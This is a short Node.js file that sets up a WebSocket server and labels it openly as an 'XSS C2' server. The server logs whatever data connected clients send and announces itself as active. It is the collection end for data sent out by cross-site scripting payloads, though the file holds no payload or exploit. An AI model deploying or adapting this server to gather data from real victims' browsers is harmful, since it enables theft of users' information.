const http = require('http');
const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('💀 WebSocket XSS C2 active.');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', socket => {
  console.log('[+] Client connected');
  socket.on('message', msg => {
    console.log(`[>] Data received: ${msg}`);
  });

  socket.send('🔥 Connected to XSS C2 server');
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
